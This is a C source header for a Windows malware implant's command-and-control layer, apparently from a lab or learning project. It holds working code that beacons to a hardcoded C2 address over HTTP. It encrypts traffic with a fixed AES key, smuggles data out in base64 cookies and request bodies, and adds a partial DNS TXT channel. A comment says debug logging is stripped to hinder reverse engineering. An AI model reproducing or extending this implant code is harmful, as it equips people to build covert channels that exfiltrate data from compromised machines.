#ifndef _WINSOCK_WRAPPER_H_
#define _WINSOCK_WRAPPER_H_
#endif

// Need to do this because windows is stupid
#ifndef _WINDOWS_
#define WIN32_LEAN_AND_MEAN
#define WIN32_NO_STATUS
#include <Windows.h>
#undef WIN32_NO_STATUS
#endif


#ifndef C2_COMMS
#define C2_COMMS


#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <time.h>
#include <shlwapi.h>
#include <ntstatus.h>
#include <winhttp.h>
#include <wincrypt.h>
#include <bcrypt.h>
#include <windns.h>
#include <processthreadsapi.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "Pathcch.lib")
#pragma comment(lib, "Winhttp.lib")
#pragma comment(lib, "Crypt32.lib")
#pragma comment(lib, "Bcrypt.lib")
#pragma comment(lib, "Dnsapi.lib")


// Function declarations
// -----------------------------------------------------------------------
int SetupComms();
void TearDownComms();
void ResetHTTPHandle();
char* base64(char* input, int len);
char* unbase64(char* buffer, int len, int* outLen);
char* Encrypt(char* msg, int len, int* pOutLen);
char* Decrypt(char* ciphertext, int len, int* pOutLen);
void c2_log(const char* format, ...);
int c2_send(char* buffer, int len);
int c2_send_body(char* buffer, int len);
int c2_recv(char* buffer, int len);
int c2_exfil(char* data, int len);
// -----------------------------------------------------------------------


// Configurations
const wchar_t* C2_IP           = L"192.168.187.13";
const short    C2_PORT         = 80;
const wchar_t* C2_API_ENDPOINT = L"/post";
const wchar_t* C2_USER_AGENT   = L"TESTNG AGENT";
char           C2_AES_KEY[16]  = { 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A' };
char           C2_AES_IV[16]   = { 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A' };

// Global handles for communication
HINTERNET hSession       = NULL;
HINTERNET hConnect       = NULL;
HINTERNET hRequest       = NULL;
BCRYPT_ALG_HANDLE hCrypt = NULL;
BCRYPT_KEY_HANDLE hKey   = NULL;

const char* ACCEPTED_FILETYPES[] = {"text/html", NULL}; // unused for now

// Gloabl heap handle
HANDLE HEAP;
#define Malloc(size) HeapAlloc(HEAP, HEAP_ZERO_MEMORY, (size))
#define Free(ptr) HeapFree(HEAP, 0, (ptr));


// Sets up global HTTP connection handlers.
// Returns 0 on success and -1 on failure.
int SetupComms() {
    NTSTATUS status;

    // Setup HTTP context
    HINTERNET hSession = WinHttpOpen(C2_USER_AGENT, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if(! hSession) {
        c2_log("[!] SetupComms:WinHttpOpen failed with status %d\n", GetLastError());
        return -1;
    }
    
    // Get connection handle (doesnt actually make the connection)
    hConnect = WinHttpConnect(hSession, C2_IP, C2_PORT, 0);
    if (! hConnect) {
        c2_log("[!] SetupComms:WinHttpConnect failed with status %d\n", GetLastError());
        return -1;
    }

    // Disable automatic cookie handling
    DWORD option = WINHTTP_DISABLE_COOKIES;
    WinHttpSetOption(hConnect, WINHTTP_OPTION_DISABLE_FEATURE, &option, sizeof(option));

    // Set heap handle
    HEAP = GetProcessHeap();
    if (! HEAP) {
        c2_log("[!] SetupComms:GetProcessHeap failed with status %d\n", GetLastError());
        return -1;
    }

    // Setup encryption context
    // TODO: maybe negotioate Diffie-Hellman key exchange rather than hard coding key
    status = BCryptOpenAlgorithmProvider(&hCrypt, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (status != STATUS_SUCCESS) {
        c2_log("[!] SetupComms:BCryptOpenAlgorithmProvider failed with status 0x%x\n", status);
        return -1;
    }

    // Set algorithm to CBC mode
    status = BCryptSetProperty(hCrypt, BCRYPT_CHAINING_MODE, (PBYTE) BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (status != STATUS_SUCCESS) {
        c2_log("[!] SetupComms:BCryptSetProperty failed with status 0x%x\n", status);
        return -1;
    }

    // Generate key
    status = BCryptGenerateSymmetricKey(hCrypt, &hKey, NULL, 0, C2_AES_KEY, sizeof(C2_AES_KEY), 0);
    if (status != STATUS_SUCCESS) {
        c2_log("[!] SetupComms:BCryptGenerateSymmetricKey failed with status 0x%x\n", status);
        return -1;
    }

    return 0;
}


// Cleans up handles
void TearDownComms() {
    if (hKey)       {BCryptDestroyKey(hKey);}
    if (hCrypt)     {BCryptCloseAlgorithmProvider(hCrypt, 0);}
    if (hRequest)   {WinHttpCloseHandle(hRequest);}
    if (hConnect)   {WinHttpCloseHandle(hConnect);}
    if (hSession)   {WinHttpCloseHandle(hSession);}
}


// Resets a request handle to that it can be reused.
void ResetHTTPHandle() {
    // Close if it exists already
    if (hRequest)
        WinHttpCloseHandle(hRequest);

    hRequest = WinHttpOpenRequest(hConnect, L"POST", C2_API_ENDPOINT, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_REFRESH);
}


// Returns pointer to base64 encoding of bytes.
// Len is length of bytes.
// Result needs to be freed eventually.
char* base64(char* bytes, int len) {
    DWORD size = len;
    char* result;

    // First call fails and tells us how much memory to allocate
    CryptBinaryToString(bytes, len, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &size);

    // Allocate memory
    result = Malloc(size * sizeof(wchar_t)); // just to be safe

    // Now call for real with proper size
    if (! CryptBinaryToString(bytes, len, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, result, &size)) {
        Free(result);
        c2_log("[!] base64:CryptBinaryToString failed with status %s\n", GetLastError());
        return NULL;
    }

    return result;
}

// Returns pointer to base64 decoding of bytes.
// Len is size of buffer
// outLen is length of decoded result
// Result needs to be freed eventually.
char* unbase64(char* buffer, int len, int* outLen) {
    DWORD size = len;
    char* result;

    // First call fails and tells us how much memory to allocate
    CryptStringToBinary(buffer, len, CRYPT_STRING_BASE64, NULL, &size, NULL, NULL);

    // Allocate memory
    result = (char*) Malloc(size);

    // Now call for real with proper size
    if (! CryptStringToBinary(buffer, len, CRYPT_STRING_BASE64, result, &size, NULL, NULL)) {
        Free(result);
        c2_log("[!] base64:CryptStringToBinary failed with status %s\n", GetLastError());
        return NULL;
    }
    *outLen = size;
    return result;
}


// Encrypts given message of length len.
// Returns pointer to ciphertext buffer.
char* Encrypt(char* msg, int len, int* pOutLen) {
    NTSTATUS status;
    char iv[16];
    char* ciperhtext;

    // Copy IV over since the API call modifies the IV
    memcpy(iv, C2_AES_IV, 16);

    // First call will fail and tell us how much data to allocate (stored in pOutLen)
    BCryptEncrypt(hKey, msg, len, NULL, iv, sizeof(iv), NULL, 0, pOutLen, BCRYPT_BLOCK_PADDING);

    // Allocate memory
    ciperhtext = (char*) Malloc(*pOutLen);

    // Now perform actual encryption
    status = BCryptEncrypt(hKey, msg, len, NULL, iv, sizeof(iv), ciperhtext, *pOutLen, pOutLen, BCRYPT_BLOCK_PADDING);
    if (status != STATUS_SUCCESS) {
        c2_log("[!] SetupComms:BCryptEncrypt failed with status 0x%x\n", status);
        Free(ciperhtext);
        return NULL;
    }

    return ciperhtext;
}


// Decrypts given message of length len.
// Returns pointer to message buffer.
char* Decrypt(char* ciphertext, int len, int* pOutLen) {
    NTSTATUS status;
    char iv[16];
    char* message;

    // Copy IV over since the API call modifies the IV
    memcpy(iv, C2_AES_IV, 16);

    // First call will fail and tell us how much data to allocate (stored in pOutLen)
    status = BCryptDecrypt(hKey, ciphertext, len, NULL, iv, sizeof(iv), NULL, 0, pOutLen, BCRYPT_BLOCK_PADDING);

    // Allocate memory
    message = (char*) Malloc(*pOutLen);

    // Now perform actual encryption
    status = BCryptDecrypt(hKey, ciphertext, len, NULL, iv, sizeof(iv), message, *pOutLen, pOutLen, BCRYPT_BLOCK_PADDING);
    if (status != STATUS_SUCCESS) {
        c2_log("[!] SetupComms:BCryptDecrypt failed with status 0x%x\n", status);
        Free(message);
        return NULL;
    }

    return message;
}




// =========================================================================
// ============================ COMMS FUNCTIONS ============================
// =========================================================================

// Conditionally compile logging function only when debug flag is set.
// This will make the program harder to reverse engineer since it won't have
// error messages anywhere.
#ifdef DEBUG
void c2_log(const char* format, ...) {
    va_list args;
    int ret;

    va_start(args, format);
    vprintf(format, args);
    va_end(args);
}
#else
void c2_log(const char* format, ...) {
    return;
}
#endif


// Sends data to C2 server in body of  HTTP request.
// More suitable for large amounts of data than c2_send.
// Len is length of data.
int c2_send_body(char* data, int len) {
    BOOL result;

    ResetHTTPHandle();

    result = WinHttpSendRequest(
        hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS,       // headers
        0,          // header length
        data,       // data
        len,        // data length
        len,        // total length
        0           // optional context?
    );

    if (!result) {
        c2_log("[!] WinHttpSendRequest failed with code %d\n", GetLastError());
        return 0;
    }
    return len;
}


// Receives data via HTTP from C2 server.
// Len is length of buffer.
int c2_recv(char* buffer, int len) {
    BOOL result;
    char* decoded;
    char* message;
    DWORD numBytesRead;

    // Don't reset handle on response, otherwise we cant get the data

    // Get response
    result = WinHttpReceiveResponse(hRequest, NULL);
    if(!result) {
        c2_log("[!] WinHttpReceiveResponse failed with code %d\n", GetLastError());
        return 0;
    }

    // Read data in response
    result = WinHttpReadData(hRequest, buffer, len, &numBytesRead);
    if(!result) {
        c2_log("[!] WinHttpReadData failed with code %d\n", GetLastError());
        return 0;
    }

    // Base64 decode data (performed in place)
    int size;
    decoded = unbase64(buffer, numBytesRead, &size);
    message = Decrypt(decoded, size, &size);
    strncpy(buffer, message, size);
    buffer[size] = '\0'; // for some reason size-1 leaves off the last byte
    
    Free(decoded);
    Free(message);

    return size;
}


// Sends data to C2 server as base64 encoded cookie in HTTP request.
// More suitable for small amounts of data than c2_send_body.
// Len is length of data.
int c2_send(char* data, int len) {
    BOOL result;
    char* enc_data;
    int size;
    wchar_t* data_wide; // data in wide char format
    wchar_t* cookie;

    ResetHTTPHandle();

    // c2_log("SEND DATA: %s\n", data);
    // c2_log("SEND LEN : %d\n", len);

    // Enccrypt data
    enc_data = Encrypt(data, len, &size);

    // Base64 encode data
    char* b64_data = base64(enc_data, size);
    int b64_len = strlen(b64_data);         // IMPORTANT: make sure to use b64_len and not len below!

    // c2_log("B64 DATA: %s\n", b64_data);
    // c2_log("B64 LEN : %d\n", strlen(b64_data));

    // Convert bas64 data to wide char string
    data_wide = (wchar_t*) Malloc(b64_len* sizeof(wchar_t));
    MultiByteToWideChar(CP_UTF8, 0, b64_data, -1, data_wide, b64_len);

    // wprintf(L"WIDE DATA: %s\n", data_wide);
    // wprintf(L"WIDE LEN : %zd\n", wcslen(data_wide));

    // Allocate memory for cookie
    cookie = (wchar_t*) Malloc((b64_len + 14) * sizeof(wchar_t)); // +14 to make room for "Cookie: data=" + null byte
    
    // Set cookie value
    swprintf(cookie, b64_len+14, L"Cookie: data=%s", data_wide);
    WinHttpAddRequestHeaders(hRequest, cookie, (ULONG)-1L, WINHTTP_ADDREQ_FLAG_ADD );

    result = WinHttpSendRequest(
        hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS,   // headers
        0,                               // header length
        WINHTTP_NO_REQUEST_DATA,         // data
        0,                               // data length
        0,                               // total length
        0                                // optional context?
    );

    Free(enc_data);
    Free(b64_data);
    Free(data_wide);
    Free(cookie);

    if (!result) {
        c2_log("[!] cookie:WinHttpSendRequest failed with code %d\n", GetLastError());
        return 0;
    }

    return len;
}


// TODO: needs lots of clean up
// TODO: need to rename this too
int c2_send2(char* msg, int len) {

    DNS_STATUS status;
    DNS_ADDR_ARRAY addrArray   = {0};
    DNS_QUERY_REQUEST request  = {0};
    PDNS_RECORD result         = NULL;
    struct sockaddr_in ip      = {0};

    PDNS_RECORD pDnsRecord = NULL;
    PIP4_ARRAY pSrvList = NULL;


    pSrvList = (PIP4_ARRAY) Malloc(20);
    pSrvList->AddrCount = 1;
    int numerical_ip = 0;
    if (InetPtonW(AF_INET, C2_IP, &numerical_ip) != 1) {
        c2_log("[!] c2_send2:InetPtonW failed\n");
        return 0;
    }
    pSrvList->AddrArray[0] = numerical_ip;


    status = DnsQuery_A("test.edu", DNS_TYPE_TEXT, DNS_QUERY_BYPASS_CACHE, pSrvList, &result, NULL);
    if (status == ERROR_INVALID_PARAMETER) {
        c2_log("[!] dns invalid param\n");
        return 0;
    }
    if (status != ERROR_SUCCESS && status != DNS_INFO_NO_RECORDS) {
        c2_log("[!] c2_send2:DnsQuery_A failed with status %d\n", status);
        return 0;
    }

    Free(pSrvList);

    // TODO actually process result
    c2_log("[+] DNS query success");
    return 1;

}

#endif